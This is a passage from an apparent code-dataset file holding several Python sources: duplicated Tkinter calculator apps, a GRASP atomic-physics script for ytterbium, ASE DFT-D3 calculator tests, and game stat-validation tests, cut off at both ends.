calc_key_objs.append(btn)\r\n\r\nfor i, calc_key_obj in enumerate(calc_key_objs):\r\n    calc_key_obj.grid(row=(i//4)+1, column=i%4, sticky='nsew')\r\n\r\nwindow.mainloop()", "375": "from graspy.grasp import *\n\ndef gen_nucleus(calc_dir,Z):\n    cmds = [Rnucleus(Z=Z,A=172,neutralMass=171.936368659,I=0,NDM=0,NQM=0,rms_radius = 5.294,thickness = 2.18)]\n    return [cmd.execute(workdir = calc_dir) for cmd in cmds]\n\ndef angular_integration(calc_dir):\n    return Rangular().execute(workdir = calc_dir)\n\ndef estimate_wavefunctions(calc_dir,previous_rwfn, grid):\n    return Rwfnestimate(grid = grid, orbdict = {'*': previous_rwfn},fallback = 'Thomas-Fermi').execute(workdir = calc_dir)\n\nmaster_grid = {'RNT': 2.857142857143E-08, 'H': 0.05, 'HP':0 , 'N': 590}\n\ndef run_hartree_fock_save(calc_dir,grid,orbs = ['*'],specorbs = ['*'],integration_method = None,calc_name = None):\n    #out = Rmcdhf(asfidx = [[1],[1],[1],[1,2],[1,2],[1,2],[1],[1,2],[1]],orbs = orbs, specorbs = specorbs, runs = 20000, weighting_method = 'Standard',integration_method = integration_method,grid = grid).execute(workdir = calc_dir)\n    out = Rmcdhf(asfidx = [[1],[1],[1],[1,2],[1,2],[1,2,3,4,5],[1],[1,2,3,4],[1,2,3,4],[1,2,3]],orbs = orbs, specorbs = specorbs, runs = 20000, weighting_method = 'Standard',integration_method = integration_method,grid = grid).execute(workdir = calc_dir)\n\n    if calc_name is not None:\n        Rsave(calc_name).execute(workdir = calc_dir)\n        return os.path.join(calc_dir,calc_name) + '.w'\n    else:\n        return out\ndef csfs_open_maxn(calc_dir,write_csf,maxn,exc):\n    # max_n: a list of 4 quantum numbers representing the maximum s,p,d, and f shells.\n    # 4f14 6s2  with 6s excitable\n    # 4f14 6s 6p with 6p excitable\n    # 4f14 6s 5d with 5d excitable\n    # 4f13 6s2 5d with 4f excitable\n    mr =   [Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(14,i)6s(2,*)',\n            activeset=[maxn[0],5,4,4],jlower=0,jhigher=2,exc=exc,\n            ordering = 'User specified',write_csf = write_csf),\n\n            Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(14,i)6s(1,i)6p(1,*)',         activeset = [6,maxn[1],5,4],jlower=0,jhigher=4,exc=exc,\n            ordering = 'User specified',write_csf = write_csf),\n\n            Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(14,i)6s(1,i)5d(1,*)',         activeset = [6,5,maxn[2],4],jlower=2,jhigher=6,exc=exc,\n            ordering = 'User specified',write_csf = write_csf),\n\n            Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(13,*)6s(2,i)5d(1,i)',         activeset = [6,5,5,maxn[3]],jlower=4,jhigher=10,exc=exc,\n            ordering = 'User specified',write_csf = write_csf)]\n    combined = mr[0] + mr[1] + mr[2] + mr[3]\n    return combined.execute(workdir = calc_dir)\n\ndef csfs_maxn(calc_dir,write_csf,maxn,exc):\n    # max_n: a list of 4 quantum numbers representing the maximum s,p,d, and f shells.\n    # 4f14 6s1 + [6s,6p,5d,5f] base configurations. for each config: allow promotion of one electron to max n.\n    mr =   [Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(14,i)6s(2,*)',\n            activeset=[maxn[0],5,4,4],jlower=0,jhigher=2,exc=exc,\n            ordering = 'User specified',write_csf = write_csf),\n\n            Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(14,i)6s(1,i)6p(1,*)',         activeset = [6,maxn[1],4,4],jlower=0,jhigher=4,exc=exc,\n            ordering = 'User specified',write_csf = write_csf),\n\n            Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(14,i)6s(1,i)5d(1,*)',         activeset = [6,5,maxn[2],4],jlower=2,jhigher=6,exc=exc,\n            ordering = 'User specified',write_csf = write_csf),\n\n            Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(14,i)6s(1,i)5f(1,*)',         activeset = [6,5,4,maxn[3]],jlower=4,jhigher=8,exc=exc,\n            ordering = 'User specified',write_csf = write_csf)]\n    combined = mr[0] + mr[1] + mr[2] + mr[3]\n    return combined.execute(workdir = calc_dir)\n\n\ncalc_dirs =['/home/calvin/graspy/calc-outputs/yb_basis_set/6sp5df',\n            '/home/calvin/graspy/calc-outputs/yb_basis_set/6sp5df',\n            '/home/calvin/graspy/calc-outputs/yb_basis_set/7spdf',\n            '/home/calvin/graspy/calc-outputs/yb_basis_set/8spdf',]\n\nrwfn_out_files = ['/home/calvin/graspy/calc-scripts/cores/yb_6s2master.w']\n################\ninitialize(workdir = calc_dirs[0],clist = ['1s','2s','2p','3s','3p','3d','4s','4p','4d','5s','5p','4f','5d','6s','6p','5f','6d','7p','8s'])\ngen_nucleus(calc_dirs[0],Z = 70)\n#csfs_6s6p5d5f_mr(calc_dirs[0],write_csf = 'rcsfmr.inp')\ncsfs_open_maxn(calc_dirs[1],maxn = [6,6,5,4],exc = 0,write_csf = 'rcsfmr.inp')\nangular_integration(calc_dirs[0])\nestimate_wavefunctions(calc_dirs[0],previous_rwfn = rwfn_out_files[-1], grid = master_grid) # use yb_6s2master.w\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[0],master_grid,orbs = ['1*','2*','3*','4s*','4p*','4d*'],specorbs = ['*'],integration_method = None,calc_name = 'core'))\n# input('1-4d OK? ') # this one looks fine.\nestimate_wavefunctions(calc_dirs[0],previous_rwfn = rwfn_out_files[-1], grid = master_grid)\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[0],master_grid,orbs = ['1*','2*','3*','4s*','4p*','4d*','5s*','5p*'],specorbs = ['*'],integration_method = 4,calc_name = 'core')) # method 4 works.\n# input('5sp OK? ')\nestimate_wavefunctions(calc_dirs[0],previous_rwfn = rwfn_out_files[-1], grid = master_grid) # use result from 6s6p5d5f\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[0],master_grid,orbs = ['1*','2*','3*','4s*','4p*','4d*','5s*','5p*','6s*'],specorbs = ['*'],integration_method = 4,calc_name = 'core')) # methods 3 and 4 work!\n# input('6s OK?')\nestimate_wavefunctions(calc_dirs[0],previous_rwfn = rwfn_out_files[-1], grid = master_grid) # use result from 6s6p5d5f\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[0],master_grid,orbs = ['1*','2*','3*','4s*','4p*','4d*','5s*','5p*','6s*','4f*'],specorbs = ['*'],integration_method = 4,calc_name = 'core')) # methods 3 and 4 work!\n# input('4f OK?')\nestimate_wavefunctions(calc_dirs[0],previous_rwfn = rwfn_out_files[-1], grid = master_grid) # use result from 6s6p5d5f\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[0],master_grid,orbs = ['1*','2*','3*','4s*','4p*','4d*','5s*','5p*','6s*','4f*','5d*'],specorbs = ['*'],integration_method = 4,calc_name = 'core')) # methods 3 and 4 work!\n# input('5d OK?')\nestimate_wavefunctions(calc_dirs[0],previous_rwfn = rwfn_out_files[-1], grid = master_grid) # use result from 6s6p5d5f\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[0],master_grid,orbs = ['*'],specorbs = ['*'],integration_method = 4,calc_name = 'core')) # methods 3 and 4 work!\ninput('spectroscopic orbitals OK?')\n#################\ninitialize(workdir = calc_dirs[1],clist = ['1s','2s','2p','3s','3p','3d','4s','4p','4d','5s','5p','4f','5d','6s','6p','5f','6d','7p','8s'])\ngen_nucleus(calc_dirs[1],Z = 70)\ncsfs_open_maxn(calc_dirs[1],maxn = [6,6,6,5],exc = 1,write_csf = 'rcsfmr.inp')\nangular_integration(calc_dirs[1])\nestimate_wavefunctions(calc_dirs[1],previous_rwfn = rwfn_out_files[-1], grid = master_grid) # use result from 6s6p5d5f\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[1],master_grid,orbs = ['1*','2*','3*','4s*','4p*','4d*','5s*','5p*','6s*','4f*','5d*','6d*'],specorbs =['1*','2*','3*','4s*','4p*','4d*','5s*','5p*','6s*','4f*','5d*'] ,integration_method = 3,calc_name = '6spd5f'))\nestimate_wavefunctions(calc_dirs[1],previous_rwfn = rwfn_out_files[-1], grid = master_grid) # use result from 6s6p5d5f\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[1],master_grid,orbs = ['5f*'],specorbs = [],integration_method = 3,calc_name = '6spd5f'))\ninput('5f OK?')\nassert(0 == 1)\n#################\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[1],master_grid,orbs = ['5d*','6d*','6f*'],specorbs = [''],integration_method = None,calc_name = '6spdf'))\n\n#################\ninitialize(workdir = calc_dirs[2],clist = ['1s','2s','2p','3s','3p','3d','4s','4p','4d','5s','5p','4f','5d','6s','6p','5f','6d','7p','8s'])\ngen_nucleus(calc_dirs[2],Z = 70)\ncsfs_7spdf(calc_dirs[2],write_csf = 'rcsf.inp')\nangular_integration(calc_dirs[2])\nestimate_wavefunctions(calc_dirs[2],previous_rwfn = rwfn_out_files[-1], grid = master_grid) # use result from 6spdf\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[2],master_grid,orbs = ['7s*','7p*','7d*','7f*'],specorbs = [''],integration_method = None,calc_name = '7spdf'))\n\ninitialize(workdir = calc_dirs[3],clist = ['1s','2s','2p','3s','3p','3d','4s','4p','4d','5s','5p','4f','5d','6s','6p','5f','6d','7p','8s'])\ngen_nucleus(calc_dirs[3],Z = 70)\ncsfs_8spdf(calc_dirs[3],write_csf = 'rcsf.inp')\nangular_integration(calc_dirs[3])\nestimate_wavefunctions(calc_dirs[3],previous_rwfn = rwfn_out_files[-1], grid = master_grid) # use result from 6spdf\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[3],master_grid,orbs = ['8s*','8p*','8d*','8f*'],specorbs = [''],integration_method = None,calc_name = '8spdf'))\nprint(rwfn_out_files)\n", "376": "import pytest\nimport numpy as np\n\nfrom ase.data.s22 import create_s22_system\nfrom ase.build import bulk\n\nreleps = 1e-6\nabseps = 1e-8\n\n\npytestmark = [pytest.mark.calculator('dftd3'),\n              pytest.mark.calculator_lite]\n\n\ndef close(val, reference, releps=releps, abseps=abseps):\n    print(val, reference)\n    assert np.abs(val - reference) < max(np.abs(releps * reference), abseps)\n\n\ndef array_close(val, reference, releps=releps, abseps=abseps):\n    valflat = val.flatten()\n    refflat = reference.flatten()\n    for i, vali in enumerate(valflat):\n        close(vali, refflat[i], releps, abseps)\n\n\n@pytest.fixture\ndef system():\n    return create_s22_system('Adenine-thymine_complex_stack')\n\n\ndef test_forces(factory, system):\n    # do all non-periodic calculations with Adenine-Thymine complex\n\n    # Default is D3(zero)\n    system.calc = factory.calc()\n    close(system.get_potential_energy(), -0.6681154466652238)\n\n    # Only check forces once, for the default settings.\n    f_ref = np.array(\n        [[0.0088385621657399, -0.0118387210205813, -0.0143242057174889],\n         [-0.0346912282737323, 0.0177797757792533, -0.0442349785529711],\n         [0.0022759961575945, -0.0087458217241648, -0.0051887171699909],\n         [-0.0049317224619103, -0.0215152368018880, -0.0062290998430756],\n         [-0.0013032612752381, -0.0356240144088481, 0.0203401124180720],\n         [-0.0110305568118348, -0.0182773178473497, -0.0023730575217145],\n         [0.0036258610447203, -0.0074994162928053, -0.0144058177906650],\n         [0.0005289754841564, -0.0035901842246731, -0.0103580836569947],\n         [0.0051775352510856, -0.0051076755874038, -0.0103428268442285],\n         [0.0011299493448658, -0.0185829345539878, -0.0087205807334006],\n         [0.0128459160503721, -0.0248356605575975, 0.0007946691695359],\n         [-0.0063194401470256, -0.0058117310787239, -0.0067932156139914],\n         [0.0013749100498893, -0.0118259631230572, -0.0235404547526578],\n         [0.0219558160992901, -0.0087512938555865, -0.0226017156485839],\n         [0.0001168268736984, -0.0138384169778581, -0.0014850073023105],\n         [0.0037893625607261, 0.0117649062330659, 0.0162375798918204],\n         [0.0011352730068862, 0.0142002748861793, 0.0129337874676760],\n         [-0.0049945288501837, 0.0073929058490670, 0.0088391871214417],\n         [0.0039715118075548, 0.0186949615105239, 0.0114822052853407],\n         [-0.0008003587963147, 0.0161735976004718, 0.0050357997715004],\n         [-0.0033142342134453, 0.0153658921418049, -0.0026233088963388],\n         [-0.0025451124688653, 0.0067994927521733, -0.0017127589489137],\n         [-0.0010451311609669, 0.0067173068779992, 0.0044413725566098],\n         [-0.0030829302438095, 0.0112138539867057, 0.0151213034444885],\n         [0.0117240581287903, 0.0161749855643631, 0.0173269837053235],\n         [-0.0025949288306356, 0.0158830629834040, 0.0155589787340858],\n         [0.0083784268665834, 0.0082132824775010, 0.0090603749323848],\n         [-0.0019694065480327, 0.0115576523485515, 0.0083901101633852],\n         [-0.0020036820791533, 0.0109276020920431, 0.0204922407855956],\n         [-0.0062424587308054, 0.0069848349714167, 0.0088791235460659]])\n\n    array_close(system.get_forces(), f_ref)\n\n    # calculate numerical forces, but use very loose comparison criteria!\n    # dftd3 doesn't print enough digits to stdout to get good convergence\n    f_numer = system.calc.calculate_numerical_forces(system, d=1e-4)\n    array_close(f_numer, f_ref, releps=1e-2, abseps=1e-3)\n\n\ndef test_d2_old(factory, system):\n    system.calc = factory.calc(old=True)\n    close(system.get_potential_energy(), -0.8923443424663762)\n\n\ndef test_d3_bj(factory, system):\n    system.calc = factory.calc(damping='bj')\n    close(system.get_potential_energy(), -1.211193213979179)\n\n\ndef test_d3_zerom(factory, system):\n    system.calc = factory.calc(damping='zerom')\n    close(system.get_potential_energy(), -2.4574447613705717)\n\n\ndef test_d3_bjm(factory, system):\n    system.calc = factory.calc(damping='bjm')\n    close(system.get_potential_energy(), -1.4662085277005799)\n\ndef test_alternative_tz(factory, system):\n    system.calc = factory.calc(tz=True)\n    close(system.get_potential_energy(), -0.6160295884482619)\n\n\ndef test_d3_zero_abc(factory, system):\n    system.calc = factory.calc(abc=True)\n    close(system.get_potential_energy(), -0.6528640090262864)\n\ndef test_d3_zero_revpbe(factory, system):\n    system.calc = factory.calc(xc='revpbe')\n    close(system.get_potential_energy(), -1.5274869363442936)\n\n\ndef test_custom_damping(factory, system):\n    system.calc = factory.calc(s6=1.1, sr6=1.1, s8=0.6, sr8=0.9, alpha6=13.0)\n    close(system.get_potential_energy(), -1.082846357973487)\n\n\ndef test_d3_bj_abc(factory, system):\n    # A couple of combinations, but not comprehensive\n    system.calc = factory.calc(damping='bj', abc=True)\n    close(system.get_potential_energy(), -1.1959417763402416)\n\n\ndef test_d3_zerom_b3lyp(factory, system):\n    system.calc = factory.calc(damping='zerom', xc='b3-lyp')\n    close(system.get_potential_energy(), -1.3369234231047677)\n\n\ndef test_diamond_stress(factory, system):\n    system = bulk('C')\n\n    system.calc = factory.calc()\n    close(system.get_potential_energy(), -0.2160072476277501)\n\n    # Do one stress for the default settings\n    s_ref = np.array([0.0182329043326,\n                      0.0182329043326,\n                      0.0182329043326,\n                      -3.22757439831e-14,\n                      -3.22766949320e-14,\n                      -3.22766949320e-14])\n\n    array_close(system.get_stress(), s_ref)\n\n    # As with numerical forces, numerical stresses will not be very well\n    # converged due to the limited number of digits printed to stdout\n    # by dftd3. So, use very loose comparison criteria.\n    s_numer = system.calc.calculate_numerical_stress(system, d=1e-4)\n    array_close(s_numer, s_ref, releps=1e-2, abseps=1e-3)\n", "377": "import tkinter as tk\r\n\r\nwindow = tk.Tk()\r\nwindow.title('SINANIS')\r\nlbl_calc_result = tk.Label(\r\n    master= window,\r\n    text= '0',\r\n    width= 30,\r\n    height=3,\r\n)\r\nlbl_calc_result.grid(row=0, column=0 , columnspan=4)\r\n\r\ndef is_last_number_decimal(current):\r\n    for char in current[::-1]:\r\n        if char == '.':\r\n            return True\r\n        if char in ['+', '-' , '*']:\r\n            return False\r\n    return False \r\n\r\ndef insert_number_in_calc_result(button_number):\r\n    current = lbl_calc_result['text']\r\n    if button_number == 'C':\r\n        lbl_calc_result['text'] = '0'\r\n    elif current == '0': \r\n        lbl_calc_result['text'] = button_number\r\n    elif button_number == '=':\r\n        if current[-1] in ['+', '-' , '*']:\r\n            current = current[:-1]      \r\n        result = f'{eval(current)}'\r\n        lbl_calc_result['text'] = result \r\n    elif button_number == '.':\r\n        if not is_last_number_decimal(current):\r\n            lbl_calc_result['text'] += button_number\r\n    elif button_number in ['+', '-' , '*'] and current[-1] in ['+', '-' , '*']:\r\n        lbl_calc_result['text'] = current[:-1] + button_number\r\n    elif current[-1] in ['+', '-' , '*'] and button_number == '0':\r\n        pass\r\n    else:\r\n        lbl_calc_result['text'] += button_number\r\n\r\ncalc_list = [\r\n    {\r\n        'text' : '7',\r\n        'command' : lambda:insert_number_in_calc_result('7'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '8',\r\n        'command' : lambda:insert_number_in_calc_result('8'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '9',\r\n        'command' : lambda:insert_number_in_calc_result('9'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '+',\r\n        'command' : lambda:insert_number_in_calc_result('+'),\r\n        'bg' : 'white' ,\r\n    },\r\n        {\r\n        'text' : '4',\r\n        'command' : lambda:insert_number_in_calc_result('4'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '5',\r\n        'command' : lambda:insert_number_in_calc_result('5'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '6',\r\n        'command' : lambda:insert_number_in_calc_result('6'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '-',\r\n        'command' : lambda:insert_number_in_calc_result('-'),\r\n        'bg' : 'white' ,\r\n    },\r\n            {\r\n        'text' : '1',\r\n        'command' : lambda:insert_number_in_calc_result('1'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '2',\r\n        'command' : lambda:insert_number_in_calc_result('2'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '3',\r\n        'command' : lambda:insert_number_in_calc_result('3'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '*',\r\n        'command' : lambda:insert_number_in_calc_result('*'),\r\n        'bg' : 'white' ,\r\n    },\r\n                {\r\n        'text' : '.',\r\n        'command' : lambda:insert_number_in_calc_result('.'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '0',\r\n        'command' : lambda:insert_number_in_calc_result('0'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : 'C',\r\n        'command' : lambda:insert_number_in_calc_result('C'),\r\n        'bg' : '#f4004f' , \r\n    },\r\n    {\r\n        'text' : '=',\r\n        'command' : lambda:insert_number_in_calc_result('='),\r\n        'bg' : 'white' ,\r\n    },\r\n    \r\n]\r\n\r\ncalc_key_objs = []\r\n\r\nfor calc_key_data in calc_list:\r\n    btn = tk.Button(\r\n        master= window,\r\n        text=calc_key_data['text'],\r\n        command=calc_key_data['command'],\r\n        height=3,\r\n        bg=calc_key_data['bg'],\r\n    )\r\n    calc_key_objs.append(btn)\r\n\r\n\r\n\r\nfor i, calc_key_obj in enumerate(calc_key_objs):\r\n    calc_key_obj.grid(row=(i//4)+1, column=i%4, sticky='nsew')\r\n\r\nwindow.mainloop()", "378": "import tkinter as tk\r\n\r\nwindow = tk.Tk()\r\nwindow.title('SINANIS')\r\nlbl_calc_result = tk.Label(\r\n    master= window,\r\n    text= '0',\r\n    width= 30,\r\n    height=3,\r\n)\r\nlbl_calc_result.grid(row=0, column=0 , columnspan=4)\r\n\r\ndef is_last_number_decimal(current):\r\n    for char in current[::-1]:\r\n        if char == '.':\r\n            return True\r\n        if char in ['+', '-' , '*']:\r\n            return False\r\n    return False \r\n\r\ndef insert_number_in_calc_result(button_number):\r\n    current = lbl_calc_result['text']\r\n    if button_number == 'C':\r\n        lbl_calc_result['text'] = '0'\r\n    elif current == '0': \r\n        lbl_calc_result['text'] = button_number\r\n    elif button_number == '=':\r\n        if current[-1] in ['+', '-' , '*']:\r\n            current = current[:-1]      \r\n        result = f'{eval(current)}'\r\n        lbl_calc_result['text'] = result \r\n    elif button_number == '.':\r\n        if not is_last_number_decimal(current):\r\n            lbl_calc_result['text'] += button_number\r\n    elif button_number in ['+', '-' , '*'] and current[-1] in ['+', '-' , '*']:\r\n        lbl_calc_result['text'] = current[:-1] + button_number\r\n    elif current[-1] in ['+', '-' , '*'] and button_number == '0':\r\n        pass\r\n    else:\r\n        lbl_calc_result['text'] += button_number\r\n\r\ncalc_list = [\r\n    {\r\n        'text' : '7',\r\n        'command' : lambda:insert_number_in_calc_result('7'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '8',\r\n        'command' : lambda:insert_number_in_calc_result('8'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '9',\r\n        'command' : lambda:insert_number_in_calc_result('9'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '+',\r\n        'command' : lambda:insert_number_in_calc_result('+'),\r\n        'bg' : 'white' ,\r\n    },\r\n        {\r\n        'text' : '4',\r\n        'command' : lambda:insert_number_in_calc_result('4'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '5',\r\n        'command' : lambda:insert_number_in_calc_result('5'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '6',\r\n        'command' : lambda:insert_number_in_calc_result('6'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '-',\r\n        'command' : lambda:insert_number_in_calc_result('-'),\r\n        'bg' : 'white' ,\r\n    },\r\n            {\r\n        'text' : '1',\r\n        'command' : lambda:insert_number_in_calc_result('1'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '2',\r\n        'command' : lambda:insert_number_in_calc_result('2'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '3',\r\n        'command' : lambda:insert_number_in_calc_result('3'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '*',\r\n        'command' : lambda:insert_number_in_calc_result('*'),\r\n        'bg' : 'white' ,\r\n    },\r\n                {\r\n        'text' : '.',\r\n        'command' : lambda:insert_number_in_calc_result('.'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '0',\r\n        'command' : lambda:insert_number_in_calc_result('0'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : 'C',\r\n        'command' : lambda:insert_number_in_calc_result('C'),\r\n        'bg' : '#f4004f' , \r\n    },\r\n    {\r\n        'text' : '=',\r\n        'command' : lambda:insert_number_in_calc_result('='),\r\n        'bg' : 'white' ,\r\n    },\r\n    \r\n]\r\n\r\ncalc_key_objs = []\r\n\r\nfor calc_key_data in calc_list:\r\n    btn = tk.Button(\r\n        master= window,\r\n        text=calc_key_data['text'],\r\n        command=calc_key_data['command'],\r\n        height=3,\r\n        bg=calc_key_data['bg'],\r\n    )\r\n    calc_key_objs.append(btn)\r\n\r\n\r\n\r\nfor i, calc_key_obj in enumerate(calc_key_objs):\r\n    calc_key_obj.grid(row=(i//4)+1, column=i%4, sticky='nsew')\r\n\r\nwindow.mainloop()", "379": "from ast import Return\r\nimport tkinter as tk\r\n\r\nwindow = tk.Tk()\r\nwindow.title('SINANIS')\r\nlbl_calc_result = tk.Label(\r\n    master= window,\r\n    text= '0',\r\n    width= 30,\r\n    height=3,\r\n)\r\nlbl_calc_result.grid(row=0, column=0 , columnspan=4)\r\n\r\ndef is_last_number_decimal(current):\r\n    for char in current[::-1]:\r\n        if char == '.':\r\n            return True\r\n        if char in ['+', '-' , '*']:\r\n            return False\r\n    return False \r\n\r\ndef insert_number_in_calc_result(button_number):\r\n    current = lbl_calc_result['text']\r\n    if button_number == 'C':\r\n        lbl_calc_result['text'] = '0'\r\n    elif current == '0': \r\n        lbl_calc_result['text'] = button_number\r\n    elif button_number == '=':\r\n        if current[-1] in ['+', '-' , '*']:\r\n            current = current[:-1]      \r\n        result = f'{eval(current)}'\r\n        lbl_calc_result['text'] = result \r\n    elif button_number == '.':\r\n        if not is_last_number_decimal(current):\r\n            lbl_calc_result['text'] += button_number\r\n    elif button_number in ['+', '-' , '*'] and current[-1] in ['+', '-' , '*']:\r\n        lbl_calc_result['text'] = current[:-1] + button_number\r\n    else:\r\n        lbl_calc_result['text'] += button_number\r\n\r\ncalc_list = [\r\n    {\r\n        'text' : '7',\r\n        'command' : lambda:insert_number_in_calc_result('7'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '8',\r\n        'command' : lambda:insert_number_in_calc_result('8'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '9',\r\n        'command' : lambda:insert_number_in_calc_result('9'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '+',\r\n        'command' : lambda:insert_number_in_calc_result('+'),\r\n        'bg' : 'white' ,\r\n    },\r\n        {\r\n        'text' : '4',\r\n        'command' : lambda:insert_number_in_calc_result('4'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '5',\r\n        'command' : lambda:insert_number_in_calc_result('5'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '6',\r\n        'command' : lambda:insert_number_in_calc_result('6'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '-',\r\n        'command' : lambda:insert_number_in_calc_result('-'),\r\n        'bg' : 'white' ,\r\n    },\r\n            {\r\n        'text' : '1',\r\n        'command' : lambda:insert_number_in_calc_result('1'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '2',\r\n        'command' : lambda:insert_number_in_calc_result('2'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '3',\r\n        'command' : lambda:insert_number_in_calc_result('3'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '*',\r\n        'command' : lambda:insert_number_in_calc_result('*'),\r\n        'bg' : 'white' ,\r\n    },\r\n                {\r\n        'text' : '.',\r\n        'command' : lambda:insert_number_in_calc_result('.'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : '0',\r\n        'command' : lambda:insert_number_in_calc_result('0'),\r\n        'bg' : 'white' ,\r\n    },\r\n    {\r\n        'text' : 'C',\r\n        'command' : lambda:insert_number_in_calc_result('C'),\r\n        'bg' : '#f4004f' , \r\n    },\r\n    {\r\n        'text' : '=',\r\n        'command' : lambda:insert_number_in_calc_result('='),\r\n        'bg' : 'white' ,\r\n    },\r\n    \r\n]\r\n\r\ncalc_key_objs = []\r\n\r\nfor calc_key_data in calc_list:\r\n    btn = tk.Button(\r\n        master= window,\r\n        text=calc_key_data['text'],\r\n        command=calc_key_data['command'],\r\n        height=3,\r\n        bg=calc_key_data['bg'],\r\n    )\r\n    calc_key_objs.append(btn)\r\n\r\n\r\n\r\nfor i, calc_key_obj in enumerate(calc_key_objs):\r\n    calc_key_obj.grid(row=(i//4)+1, column=i%4, sticky='nsew')\r\n\r\nwindow.mainloop()", "380": "import re\n\nimport io\n\nimport artifact_calc\n\ndef test_validate_rarity():\n    assert artifact_calc.validate_rarity(\"4\") == True\n    assert artifact_calc.validate_rarity(\"s\") == False\n    assert artifact_calc.validate_rarity(4) == False\n    assert artifact_calc.validate_rarity(\"5\") == True\n    assert artifact_calc.validate_rarity(\"3\") == True\n    assert artifact_calc.validate_rarity(\"2\") == False\n    assert artifact_calc.validate_rarity(\"1\") == False\n    assert artifact_calc.validate_rarity(\"6\") == False\n\ndef test_validate_artifact_slots():\n    assert artifact_calc.validate_artifact_slot(\"circlet\") == True\n    assert artifact_calc.validate_artifact_slot(\"goble\") == False\n    assert artifact_calc.validate_artifact_slot(\"goblett\") == False\n    assert artifact_calc.validate_artifact_slot(1) == False\n    assert artifact_calc.validate_artifact_slot(\"time-piece\") == False\n    \ndef test_validate_main_stat():\n    assert artifact_calc.validate_main_stat(\"circlet\", \"hp%\") == True\n    assert artifact_calc.validate_main_stat(\"timepiece\", \"recharge\") == True\n    assert artifact_calc.validate_main_stat(\"goblet\", \"physical damage\") == True\n    assert artifact_calc.validate_main_stat(\"circlet\", \"elemental damage\") == False\n    assert artifact_calc.validate_main_stat(\"timepiece\", \"crit rate\") == False\n    assert artifact_calc.validate_main_stat(\"goblet\", \"crit rate\") == False\n    \n\ndef test_validate_set_selection():\n    assert artifact_calc.validate_set_selection(5, \"gladiator's\") == True\n    assert artifact_calc.validate_set_selection(5, \"resolution of sojourner\") == False\n    assert artifact_calc.validate_set_selection(4, \"bloodstained chivalry\") == True\n    assert artifact_calc.validate_set_selection(4, \"instructor\") == True\n    assert artifact_calc.validate_set_selection(4, \"5\") == False\n\ndef test_validate_off_stats():\n    assert artifact_calc.validate_off_stats(\"crit rate\", [], \"atk%\") == True\n    assert artifact_calc.validate_off_stats(\"crit rate\", [], \"crit rate\") == False\n    assert artifact_calc.validate_off_stats(\"crit rate\", [\"crit rate\"], \"atk%\") == False\n    assert artifact_calc.validate_off_stats(\"\", [], \"atk%\") == False\n\n    ", "381": "import unittest\nfrom unittest.mock import patch\nimport pytest\n\nfrom app.calc import Calculator\n\n\ndef mocked_validation(*args, **kwargs):\n    return True\n\n\n@pytest.mark.unit\nclass TestCalculate(unittest.TestCase):\n    def setUp(self):\n        self.calc = Calculator()\n\n    #CORRECT RESULTS SECTION\n    def test_add_method_returns_correct_result(self):\n        self.assertEqual(4, self.calc.add(2, 2))\n        self.assertEqual(0, self.calc.add(2, -2))\n        self.assertEqual(0, self.calc.add(-2, 2))\n        self.assertEqual(1, self.calc.add(1, 0))\n    \n    def test_substract_method_returns_correct_result(self):\n        self.assertEqual(0, 